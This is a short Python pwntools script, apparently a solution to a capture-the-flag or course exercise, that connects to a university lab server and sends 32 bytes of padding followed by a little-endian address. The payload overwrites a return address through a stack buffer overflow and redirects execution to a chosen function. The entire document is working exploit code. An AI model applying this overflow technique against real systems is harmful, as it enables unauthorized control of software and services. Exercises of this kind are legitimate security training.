from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25153

s =  remote(SERVER, PORT, timeout=9999)

print(s.recvline())
s.sendline(b"a"*32 + 0x80486f1.to_bytes(4, 'little'))
print(s.recvall())